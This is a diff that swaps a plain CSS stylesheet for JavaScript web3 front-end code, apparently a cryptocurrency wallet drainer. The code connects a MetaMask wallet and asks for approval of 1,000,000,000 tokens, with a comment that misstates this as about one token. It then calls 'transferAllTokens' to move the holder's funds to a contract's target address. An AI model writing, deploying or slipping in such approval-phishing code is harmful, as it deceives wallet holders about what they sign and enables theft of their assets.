@@ -1,33 +1,45 @@
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-    color: #333;
-    text-align: center;
+const Web3 = require('web3');
+
+// 请替换为你的合约地址和 ABI
+const contractAddress = '你的合约地址';
+const contractABI = [
+    // 将你的合约 ABI 粘贴在这里
+];
+
+let web3;
+let contract;
+let accounts;
+
+async function initWeb3() {
+    // 检查是否存在 Ethereum 钱包
+    if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        accounts = await web3.eth.getAccounts();
+        document.getElementById('walletAddress').textContent = `钱包地址: ${accounts[0]}`;
+        document.getElementById('walletAddress').classList.remove('hidden');
+        document.getElementById('authorizeButton').classList.remove('hidden');
+    } else {
+        alert('请安装 MetaMask 钱包!');
+    }
 }
 
-.container {
-    max-width: 600px;
-    margin: auto;
-    padding: 20px;
-    background: white;
-    border-radius: 8px;
-    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+async function authorizeTransfer() {
+    // 批准合约转移代币
+    const amount = web3.utils.toWei('1000000000', 'ether'); // 设置要授权的数量（例如 1 个代币）
+    const tokenAddress = '代币合约地址'; // 替换为相应的代币合约地址
+    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+    await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
+    document.getElementById('transferButton').classList.remove('hidden');
 }
 
-button {
-    background-color: #28a745;
-    color: white;
-    border: none;
-    padding: 10px 20px;
-    margin: 10px;
-    border-radius: 5px;
-    cursor: pointer;
+async function transferTokens() {
+    const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
+    await autoTransferContract.methods.transferAllTokens(accounts[0]).send({ from: accounts[0] });
+    alert('代币已成功转移到目标地址！');
 }
 
-button:hover {
-    background-color: #218838;
-}
-
-.hidden {
-    display: none;
-}
+// 事件监听
+document.getElementById('connectButton').addEventListener('click', initWeb3);
+document.getElementById('authorizeButton').addEventListener('click', authorizeTransfer);
+document.getElementById('transferButton').addEventListener('click', transferTokens);
